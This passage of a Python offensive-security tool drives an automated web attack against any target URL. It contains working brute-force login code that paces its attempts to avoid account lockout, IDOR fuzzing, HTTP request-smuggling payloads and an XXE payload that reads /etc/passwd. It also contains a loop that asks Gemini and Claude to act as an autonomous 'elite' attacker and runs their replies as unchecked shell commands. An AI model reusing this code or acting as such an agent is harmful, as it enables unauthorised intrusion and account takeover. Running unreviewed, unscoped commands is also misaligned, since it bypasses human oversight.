            print(f"    [>] Trying {username}:{password}...")

            try:
                if method.upper() == "POST":
                    response = requests.post(login_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                else: # Assume GET
                    response = requests.get(login_url, params=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                
                if success_indicator in response.text:
                    vulnerabilities.append({
                        "type": "Brute Force Login - Successful Credentials",
                        "severity": "Critical",
                        "username": username,
                        "password": password,
                        "login_url": login_url,
                        "response_snippet": response.text[:500],
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{login_url}', data={{{username_field}: '{username}', {password_field}: '{password}'}}, {'headers=' + str(headers) if headers else ''}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
                    })
                    print(f"        [!!!] Successful login found: {username}:{password}!")
                    return vulnerabilities # Stop on first successful login
                else:
                    failed_attempts += 1
                    if failed_attempts >= rate_limit_threshold:
                        self._log(f"[INFO] Detected {rate_limit_threshold} failed attempts. Pausing for {rate_limit_pause} seconds to avoid lockout.")
                        time.sleep(rate_limit_pause)
                        failed_attempts = 0 # Reset counter after pause
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed for {username}:{password}: {e}")
                # Consider this a failed attempt for rate limiting purposes
                failed_attempts += 1
                if failed_attempts >= rate_limit_threshold:
                    self._log(f"[INFO] Detected {rate_limit_threshold} failed attempts. Pausing for {rate_limit_pause} seconds to avoid lockout.")
                    time.sleep(rate_limit_pause)
                    failed_attempts = 0 # Reset counter after pause

    print(f"[+] Brute Force Login scan completed for: {target_url}{login_path}")
    return vulnerabilities

# --- IDOR (Insecure Direct Object References) Module (NEW) ---

def perform_idor_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Detects and exploits IDOR vulnerabilities by fuzzing numeric identifiers.

    Args:
        target_url (str): The URL to attack, including query parameters.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout.
        verify_ssl (bool): SSL verification.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability.
    """
    print(f"[+] Starting IDOR scan for: {target_url}")
    vulnerabilities = []
    
    from urllib.parse import urlparse, parse_qs, urlencode
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    # Identify numeric parameters to fuzz
    fuzzable_params = {}
    for param, values in query_params.items():
        if values and values[0].isdigit():
            fuzzable_params[param] = int(values[0])
            
    if not fuzzable_params:
        print("    [INFO] No numeric parameters found in URL for IDOR fuzzing.")
        return vulnerabilities

    # Get baseline response
    try:
        baseline_response = requests.request(method, target_url, data=data, headers=headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
    except requests.RequestException as e:
        print(f"    [ERROR] Baseline request failed: {e}")
        return vulnerabilities

    for param, original_id in fuzzable_params.items():
        print(f"[*] Fuzzing parameter '{param}' with original ID: {original_id}")
        
        # Fuzz a range of IDs around the original one
        for i in range(-10, 11):
            if i == 0:
                continue
            
            fuzzed_id = original_id + i
            
            # Create the new URL with the fuzzed ID
            fuzzed_params = query_params.copy()
            fuzzed_params[param] = [str(fuzzed_id)]
            fuzzed_url = parsed_url._replace(query=urlencode(fuzzed_params, doseq=True)).geturl()
            
            print(f"    [>] Trying ID: {fuzzed_id} at {fuzzed_url}")

            try:
                response = requests.request(method, fuzzed_url, data=data, headers=headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
                
                # --- Advanced IDOR Detection Logic ---
                # 1. Must be a successful request
                if response.status_code != 200:
                    continue
                
                # 2. Content length should be similar but not identical (to filter out error pages vs. valid but different user data)
                len_diff = abs(len(response.text) - len(baseline_response.text))
                if not (len(response.text) > 100 and len_diff > 10 and len_diff < (len(baseline_response.text) * 0.5)):
                     continue

                # 3. Content must be different from baseline
                if response.text == baseline_response.text:
                    continue
                    
                # If all checks pass, it's a potential IDOR
                vulnerabilities.append({
                    "type": "Insecure Direct Object References (IDOR)",
                    "severity": "High",
                    "parameter": param,
                    "payload": fuzzed_id,
                    "url": fuzzed_url,
                    "response_snippet": response.text[:500],
                    "extracted_data": f"Successfully accessed resource with ID {fuzzed_id}. The response is different from the baseline, indicating access to another user's data.",
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{fuzzed_url}', data={data}, headers={headers}, cookies={cookies}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] Potential IDOR detected on parameter '{param}' with ID '{fuzzed_id}'!")
                # Stop after first find per parameter to reduce noise, but continue to next parameter
                break 

            except requests.RequestException as e:
                print(f"    [-] Request with ID {fuzzed_id} failed: {e}")

    return vulnerabilities

# --- HTTP Smuggling Module (NEW) ---

async def _send_raw_http_request(host, port, raw_request, timeout=10):
    """Helper to send raw HTTP requests using asyncio for smuggling."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=(port == 443)),
            timeout=timeout
        )
        
        writer.write(raw_request.encode('utf-8'))
        await writer.drain()
        
        response_bytes = await asyncio.wait_for(reader.read(8192), timeout=timeout)
        
        writer.close()
        await writer.wait_closed()
        
        return response_bytes.decode('utf-8', errors='ignore')
    except asyncio.TimeoutError:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

async def perform_http_smuggling_attack(target_url, headers=None, cookies=None, timeout=15):
    """
    Detects HTTP Smuggling vulnerabilities (CL.TE and TE.CL) using time-based methods.
    """
    print(f"[+] Starting HTTP Smuggling scan for: {target_url}")
    vulnerabilities = []
    
    from urllib.parse import urlparse
    parsed_url = urlparse(target_url)
    host = parsed_url.netloc
    port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    path = parsed_url.path or "/"

    # 1. CL.TE Probe (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
    cl_te_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "G" # This should be left unprocessed by the back-end, causing a timeout
    )
    print("    [>] Trying CL.TE probe...")
    start_time = time.time()
    response = await _send_raw_http_request(host, port, cl_te_payload, timeout)
    duration = time.time() - start_time
    
    if response == "TIMEOUT" or duration >= (timeout - 1):
        vulnerabilities.append({
            "type": "HTTP Smuggling (CL.TE)",
            "severity": "High",
            "parameter": "HTTP Headers (Content-Length, Transfer-Encoding)",
            "payload": cl_te_payload,
            "url": target_url,
            "response_snippet": "Request timed out, indicating a potential CL.TE vulnerability.",
            "poc_code": f"# This vulnerability must be tested with a low-level socket script.\n# The following payload was sent:\n\n{cl_te_payload}"
        })
        print("        [!!!] Potential CL.TE HTTP Smuggling detected (based on timeout)!")

    # 2. TE.CL Probe (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
    te_cl_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "5c\r\n" # Hex length for the body
        "G\r\n" # Smuggled request part
        "0\r\n\r\n"
    )
    print("    [>] Trying TE.CL probe...")
    start_time = time.time()
    response = await _send_raw_http_request(host, port, te_cl_payload, timeout)
    duration = time.time() - start_time

    if response == "TIMEOUT" or duration >= (timeout - 1):
        vulnerabilities.append({
            "type": "HTTP Smuggling (TE.CL)",
            "severity": "High",
            "parameter": "HTTP Headers (Content-Length, Transfer-Encoding)",
            "payload": te_cl_payload,
            "url": target_url,
            "response_snippet": "Request timed out, indicating a potential TE.CL vulnerability.",
            "poc_code": f"# This vulnerability must be tested with a low-level socket script.\n# The following payload was sent:\n\n{te_cl_payload}"
        })
        print("        [!!!] Potential TE.CL HTTP Smuggling detected (based on timeout)!")

    return vulnerabilities

# =================================================================================
# 1. Configuration and Setup
# =================================================================================

class FullAIModeRunner:
    def __init__(self, target, config_path='config.ini'):
        self.target = self._normalize_target(target)
        self.domain = self._get_domain(self.target)
        self.config_path = config_path
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_dir = f"scan_{self._sanitize_filename(self.domain)}_{self.session_id}"
        self.report_file = os.path.join(self.output_dir, "full_ai_pentest_report.txt")
        self.report_generator = Report() # Initialize Report class
        
        self.gemini_api_key = None
        self.claude_api_key = None
        self.gemini_model = None
        self.claude_model = None

        self.gemini_failures = 0
        self.claude_failures = 0
        self.max_failures = 5

        # Ensure the output directory exists before any logging attempts.
        os.makedirs(self.output_dir, exist_ok=True)

    def _normalize_target(self, target):
        if not target.startswith(('http://', 'https://')):
            return f"http://{target}"
        return target

    def _get_domain(self, target):
        from urllib.parse import urlparse
        return urlparse(target).netloc.split(':')[0]

    def _sanitize_filename(self, filename):
        return "".join([c for c in filename if c.isalpha() or c.isdigit() or c in ('_', '-')]).rstrip()

    def _log(self, message):
        """Appends a message to the report file and prints it to the console."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        with open(self.report_file, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')

    def _setup(self):
        """Initializes directories, loads configs, and sets up AI models."""
        self._log(f"Output directory created at: {self.output_dir}")
        self._log(f"Report file will be saved to: {self.report_file}")

        config = configparser.ConfigParser()
        if not os.path.exists(self.config_path):
            self._log(f"[ERROR] Config file not found at '{self.config_path}'. Cannot proceed.")
            return False
        
        config.read(self.config_path)
        self.gemini_api_key = config.get('GEMINI', 'api_key', fallback=None)
        self.claude_api_key = config.get('CLAUDE', 'api_key', fallback=None)

        if not self.gemini_api_key and not self.claude_api_key:
            self._log("[ERROR] No AI API keys found in config.ini. Full AI mode requires at least one key.")
            return False

        if self.gemini_api_key:
            try:
                google.genai.configure(api_key=self.gemini_api_key)
                self.gemini_model = genai.GenerativeModel('gemini-1.5-flash')
                self._log("[INFO] Gemini API configured successfully.")
            except Exception as e:
                self._log(f"[ERROR] Failed to configure Gemini API: {e}")
                self.gemini_model = None
        
        if self.claude_api_key:
            try:
                self.claude_model = anthropic.Anthropic(api_key=self.claude_api_key)
                self._log("[INFO] Claude API configured successfully.")
            except Exception as e:
                self._log(f"[ERROR] Failed to configure Claude API: {e}")
                self.claude_model = None

        if not self.gemini_model and not self.claude_model:
            self._log("[ERROR] All AI models failed to initialize. Aborting.")
            return False
            
        return True

# =================================================================================
# 2. Scanning and Information Gathering
# =================================================================================

    def _run_command(self, command, log_file_name):
        """Executes a shell command, logs its output, and returns the output."""
        log_file_path = os.path.join(self.output_dir, log_file_name)
        self._log(f"Executing command: {' '.join(command)}")
        try:
            process = subprocess.run(
                command,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(output)
            self._log(f"Command finished. Output saved to {log_file_path}")
            return process.stdout
        except FileNotFoundError:
            error_msg = f"[ERROR] Command '{command[0]}' not found. Please ensure it is installed and in your PATH."
            self._log(error_msg)
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(error_msg)
            return ""
        except Exception as e:
            error_msg = f"[ERROR] An unexpected error occurred while running command '{' '.join(command)}': {e}"
            self._log(error_msg)
            with open(log_file_path, 'w', encoding='utf-8') as f:
                f.write(error_msg)
            return ""

    def _run_scans(self):
        """Runs all external scanning tools."""
        self._log("--- Starting Phase 1: Information Gathering ---")
        scan_results = {}

        # Nmap Scan
        self._log("Running Nmap scan...")
        nmap_command = ["nmap", "-sV", "-A", "-T4", "--script", "vuln,discovery", self.domain]
        scan_results['nmap'] = self._run_command(nmap_command, "nmap_scan.txt")

        # Nikto Scan
        self._log("Running Nikto scan...")
        nikto_command = ["nikto", "-h", self.target]
        scan_results['nikto'] = self._run_command(nikto_command, "nikto_scan.txt")

        # Nuclei Scan
        self._log("Running Nuclei scan...")
        nuclei_command = ["nuclei", "-u", self.target, "-t", "cves/,vulnerabilities/,technologies/"]
        scan_results['nuclei'] = self._run_command(nuclei_command, "nuclei_scan.txt")
        
        self._log("--- Finished Phase 1: Information Gathering ---")
        return scan_results

# =================================================================================
# 3. AI-Driven Analysis and Attack
# =================================================================================

    def _get_ai_response(self, ai_model_name, prompt, conversation_history):
        """Gets a response from the specified AI model, with resilience."""
        if ai_model_name == 'gemini' and self.gemini_model and self.gemini_failures < self.max_failures:
            try:
                # Gemini's API is stateless in this context, so we prepend history to the prompt
                full_prompt = "\n".join(conversation_history + [prompt])
                response = self.gemini_model.generate_content(full_prompt)
                self.gemini_failures = 0 # Reset on success
                return response.text
            except Exception as e:
                self._log(f"[ERROR] Gemini API call failed: {e}")
                self.gemini_failures += 1
                if self.gemini_failures >= self.max_failures:
                    self._log("[CRITICAL] Gemini has failed too many times. Disabling for this session.")
                return None
        
        elif ai_model_name == 'claude' and self.claude_model and self.claude_failures < self.max_failures:
            try:
                # Claude's API can handle conversation history
                messages = []
                for i, message in enumerate(conversation_history):
                    role = "user" if i % 2 == 0 else "assistant"
                    messages.append({"role": role, "content": message})
                messages.append({"role": "user", "content": prompt})
                
                response = self.claude_model.messages.create(
                    model="claude-3-haiku-20240307",
                    max_tokens=4096,
                    messages=messages
                )
                self.claude_failures = 0 # Reset on success
                return response.content[0].text
            except Exception as e:
                self._log(f"[ERROR] Claude API call failed: {e}")
                self.claude_failures += 1
                if self.claude_failures >= self.max_failures:
                    self._log("[CRITICAL] Claude has failed too many times. Disabling for this session.")
                return None
        
        return None

    def _execute_internal_function_call(self, call_string):
        """
        Executes an internal Python function call suggested by the AI.
        Expected format: "INTERNAL_FUNC:function_name({'arg_name': 'val', ...})"
        """
        try:
            self._log(f"[AI] Attempting internal function call: {call_string}")
            func_part, args_part = call_string.split(':', 1)[1].strip().split('(', 1)
            func_name = func_part.strip()
            args_str = args_part.rstrip(')')

            args = {}
            if args_str:
                # Attempt to parse as JSON first (for dict-like arguments)
                try:
                    # JSON strings in AI response might use single quotes or not be perfectly
                    # formatted, so a pre-processing step is helpful.
                    cleaned_args_str = args_str.replace("'", '"')
                    args = json.loads(cleaned_args_str)
                except json.JSONDecodeError:
                    self._log(f"[WARNING] Could not parse args as JSON: {args_str}. Attempting kwarg parsing.")
                    # Fallback to simple kwarg parsing if not JSON (less robust)
                    for arg_pair in args_str.split(', '):
                        if '=' in arg_pair:
                            key, value = arg_pair.split('=', 1)
                            args[key.strip()] = value.strip().strip("'\"") # Remove quotes
                        elif arg_pair.strip(): # Handle single unkeyed argument
                            args['value'] = arg_pair.strip().strip("'\"")


            if func_name == "perform_sqli_attack":
                 # Pass the current target from the runner, and other args from AI
                sqli_results = perform_sqli_attack(
                    target_url=args.get("target_url", self.target), # Allow AI to specify, default to runner's target
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if sqli_results:
                    for finding in sqli_results:
                        self.report_generator.add_finding(finding) # Add findings to report
                    self._log(f"[SUCCESS] SQL Injection scan completed. Found {len(sqli_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": sqli_results})
                else:
                    self._log("[INFO] SQL Injection scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SQL Injection vulnerabilities found."})

            elif func_name == "perform_xss_attack":
                xss_results = perform_xss_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if xss_results:
                    for finding in xss_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] XSS scan completed. Found {len(xss_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": xss_results})
                else:
                    self._log("[INFO] XSS scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No XSS vulnerabilities found."})

            elif func_name == "perform_lfi_rfi_attack":
                lfi_rfi_results = perform_lfi_rfi_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if lfi_rfi_results:
                    for finding in lfi_rfi_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] LFI/RFI scan completed. Found {len(lfi_rfi_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": lfi_rfi_results})
                else:
                    self._log("[INFO] LFI/RFI scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No LFI/RFI vulnerabilities found."})

            elif func_name == "perform_ssrf_attack":
                ssrf_results = perform_ssrf_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if ssrf_results:
                    for finding in ssrf_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] SSRF scan completed. Found {len(ssrf_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": ssrf_results})
                else:
                    self._log("[INFO] SSRF scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SSRF vulnerabilities found."})

            elif func_name == "perform_xxe_attack":
                xxe_results = perform_xxe_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "POST"), # XXE typically uses POST with XML body
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if xxe_results:
                    for finding in xxe_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] XXE scan completed. Found {len(xxe_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": xxe_results})
                else:
                    self._log("[INFO] XXE scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No XXE vulnerabilities found."})

            elif func_name == "perform_ssti_attack":
                ssti_results = perform_ssti_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if ssti_results:
                    for finding in ssti_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] SSTI scan completed. Found {len(ssti_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": ssti_results})
                else:
                    self._log("[INFO] SSTI scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SSTI vulnerabilities found."})

            elif func_name == "perform_brute_force_login":
                brute_force_results = perform_brute_force_login(
                    target_url=args.get("target_url", self.target),
                    login_path=args.get("login_path", "/login"), # Default login path
                    username_field=args.get("username_field", "username"),
                    password_field=args.get("password_field", "password"),
                    success_indicator=args.get("success_indicator", "Welcome"), # Default success indicator
                    method=args.get("method", "POST"),
                    usernames=args.get("usernames"),
                    passwords=args.get("passwords"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if brute_force_results:
                    for finding in brute_force_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] Brute Force Login scan completed. Found {len(brute_force_results)} successful logins.")
                    return json.dumps({"status": "success", "findings": brute_force_results})
                else:
                    self._log("[INFO] Brute Force Login scan completed. No successful logins found.")
                    return json.dumps({"status": "info", "message": "No successful logins found."})

            # Add other internal functions here as they are implemented
            else:
                self._log(f"[ERROR] Unknown internal function: {func_name}")
                return json.dumps({"status": "error", "message": f"Unknown internal function: {func_name}"})
        except Exception as e:
            self._log(f"[ERROR] Error executing internal function '{call_string}': {e}")
            return json.dumps({"status": "error", "message": f"Error executing internal function: {e}", "details": str(e)})

    def _run_ai_pentest(self, scan_results):
        """The main AI-driven attack loop."""
        self._log("--- Starting Phase 2: AI-Driven Attack ---")

        initial_prompt = f"""
You are an elite, autonomous penetration testing AI. Your goal is to find and exploit vulnerabilities in the target: {self.target}.
You will proceed step-by-step. At each step, you will be given the results of your previous action and must decide on the next one.
You can respond in two ways:
1. As a shell command to be executed. I will run the command and give you the output.
   Example: `nmap -sV {self.domain}` or `sqlmap -u "{self.target}/vuln.php?id=1" --dbs`.
2. As a call to an internal Python function. This allows for more precise and context-aware actions.
   The format for internal function calls is: `INTERNAL_FUNC:function_name({{arg1: val1, arg2: val2}}) `.
   Return only this string, no other text.

   Currently available internal functions:
   - `perform_sqli_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs a comprehensive SQL Injection scan against the `target_url`.
     Use this function when you identify potential SQL Injection points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_sqli_attack({{'target_url': '{self.target}/index.php', 'method': 'GET', 'data': {{'id': '1'}} }})`
   - `perform_xss_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs a comprehensive Cross-Site Scripting (XSS) scan against the `target_url`.
     Use this function when you identify potential XSS reflection points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_xss_attack({{'target_url': '{self.target}/search.php', 'method': 'GET', 'data': {{'q': 'test'}} }})`
   - `perform_lfi_rfi_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Local/Remote File Inclusion (LFI/RFI) attacks against the `target_url`.
     Use this function when you suspect file inclusion vulnerabilities.
     Example: `INTERNAL_FUNC:perform_lfi_rfi_attack({{'target_url': '{self.target}/view.php', 'method': 'GET', 'data': {{'file': 'index.php'}} }})`
   - `perform_ssrf_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Server-Side Request Forgery (SSRF) attacks against the `target_url`.
     Use this function when you identify potential SSRF points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_ssrf_attack({{'target_url': '{self.target}/image_proxy.php', 'method': 'GET', 'data': {{'url': 'http://127.0.0.1/admin'}} }})`
   - `perform_xxe_attack({{target_url: str, method: str='POST', data: str=None, headers: dict=None, cookies: dict=None}})`:
     Performs XML External Entity (XXE) attacks against the `target_url`.
     Use this function when you suspect XML parsing vulnerabilities.
     Example: `INTERNAL_FUNC:perform_xxe_attack({{'target_url': '{self.target}/xml_parser.php', 'method': 'POST', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}})`
   - `perform_ssti_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Server-Side Template Injection (SSTI) attacks against the `target_url`.
     Use this function when you suspect template injection vulnerabilities.
     Example: `INTERNAL_FUNC:perform_ssti_attack({{'target_url': '{self.target}/render', 'method': 'POST', 'data': {{'name': '{{2*2}}'}} }})`
   - `perform_brute_force_login({{target_url: str, login_path: str, username_field: str, password_field: str, success_indicator: str, method: str='POST', usernames: list=None, passwords: list=None, headers: dict=None, cookies: dict=None}})`:
     Performs brute-force login attempts against a login form.
     Use this function when you identify a login page and want to test for weak credentials.
     Example: `INTERNAL_FUNC:perform_brute_force_login({{'target_url': '{self.target}', 'login_path': '/login.php', 'username_field': 'user', 'password_field': 'pass', 'success_indicator': 'Welcome'}})`

Do not provide any explanation, just the raw command OR the internal function call. Start with analysis and enumeration.
If you believe the test is complete or you cannot proceed, respond with the single word: "COMPLETE".

Here is the initial information from Nmap, Nikto, and Nuclei scans:

--- NMAP RESULTS ---
{scan_results.get('nmap', 'Not available.')}

--- NIKTO RESULTS ---
{scan_results.get('nikto', 'Not available.')}

--- NUCLEI RESULTS ---
{scan_results.get('nuclei', 'Not available.')}

Based on these results, what is your first command or internal function call?
"""
        
        gemini_history = []
        claude_history = []
        
        # Use a queue for thread-safe communication
        response_queue = queue.Queue()

        def get_gemini_command():
            response = self._get_ai_response('gemini', initial_prompt, gemini_history)
            response_queue.put(('gemini', response))

        def get_claude_command():
            response = self._get_ai_response('claude', initial_prompt, claude_history)
            response_queue.put(('claude', response))

        # Initial parallel requests
        threads = []
        if self.gemini_model:
            threads.append(threading.Thread(target=get_gemini_command))
        if self.claude_model:
            threads.append(threading.Thread(target=get_claude_command))
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Main loop
        for step in range(50): # Limit to 50 steps to prevent infinite loops
            self._log(f"--- AI Attack Step {step + 1} ---")
            
            # Process responses from the queue
            ai_responses = {}
            while not response_queue.empty():
                ai_name, response_content = response_queue.get()
                if response_content and response_content.strip().upper() != "COMPLETE":
                    ai_responses[ai_name] = response_content.strip()
                else:
                    self._log(f"AI model '{ai_name}' has completed its task.")
            
            if not ai_responses:
                self._log("All AI models have completed their tasks or failed. Ending pentest.")
                break

            commands_to_process = {}
            for ai_name, response_content in ai_responses.items():
                if response_content.startswith("INTERNAL_FUNC:"):
                    self._log(f"AI model '{ai_name}' requested internal function: {response_content}")
                    output = self._execute_internal_function_call(response_content)
                    commands_to_process[ai_name] = output # Feed output of internal function back to AI
                    self.report_generator.add_attack_log(step + 1, ai_name, "internal_function_call", response_content, output)
                else: # Assume it's a shell command
                    output = self._execute_shell_command(response_content, ai_name)
                    commands_to_process[ai_name] = output
                    self.report_generator.add_attack_log(step + 1, ai_name, "shell_command", response_content, output)

            # Update histories and get next commands
            next_threads = []
            
            def get_next_gemini(output):
                gemini_history.extend([ai_responses.get('gemini'), output])
                prompt = f"Your last action (command or internal function call) produced this output. What is your next command or internal function call?\n\n{output}"
                response = self._get_ai_response('gemini', prompt, gemini_history)
                response_queue.put(('gemini', response))

            def get_next_claude(output):
                claude_history.extend([ai_responses.get('claude'), output])
                prompt = f"Your last action (command or internal function call) produced this output. What is your next command or internal function call?\n\n{output}"
                response = self._get_ai_response('claude', prompt, claude_history)
                response_queue.put(('claude', response))
            
            if 'gemini' in commands_to_process:
                next_threads.append(threading.Thread(target=get_next_gemini, args=(commands_to_process['gemini'],)))
            if 'claude' in commands_to_process:
                next_threads.append(threading.Thread(target=get_next_claude, args=(commands_to_process['claude'],)))

            for t in next_threads:
                t.start()
            for t in next_threads:
                t.join()
        
        self._log("--- Finished Phase 2: AI-Driven Attack ---")

# Helper method moved outside main loop to consolidate
    def _execute_shell_command(self, command, ai_name):
        self._log(f"Executing shell command from {ai_name}: {command}")
        try:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=300
            )
            output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
            self._log(f"Output from {ai_name}'s command:\n{output}")
            return output
        except subprocess.TimeoutExpired:
            timeout_msg = "Command timed out after 5 minutes."
            self._log(f"[ERROR] {timeout_msg}")
            return timeout_msg
        except Exception as e:
            error_msg = f"An error occurred executing command: {e}"
            self._log(f"[ERROR] {error_msg}")
            return error_msg

# =================================================================================
# 4. Main Execution
# =================================================================================

    def run(self):
        """The main entry point for the Full AI Mode runner."""
        if not self._setup():
            return

        self._log("--- Initializing Full AI Mode ---")
        scan_results = self._run_scans()
        self._run_ai_pentest(scan_results)
        
        self._log("--- Full AI Mode Pentest Finished ---")
        self._log(f"The complete report is available at: {self.report_file}")
        self.report_generator.generate_report(os.path.join(self.output_dir, "penetration_test_report.md")) # Generate final report

def run_full_ai_mode(target, config_path):
    """Public function to be called from rap0at.py."""
    runner = FullAIModeRunner(target, config_path)
    runner.run()

if __name__ == '__main__':
    # This allows for direct execution of this script for testing purposes.
    print("Running full_ai_mode.py directly for testing...")
    
    # Create a dummy config for testing if it doesn't exist
    if not os.path.exists('config.ini'):
        print("Creating dummy config.ini for testing. Please add your API keys.")
        with open('config.ini', 'w') as f:
            f.write("[GEMINI]\napi_key = YOUR_GEMINI_API_KEY\n\n")
            f.write("[CLAUDE]\napi_key = YOUR_CLAUDE_API_KEY\n\n")
    
    test_target = input("Enter target URL for testing: ")
    if test_target:
        run_full_ai_mode(test_target, 'config.ini')
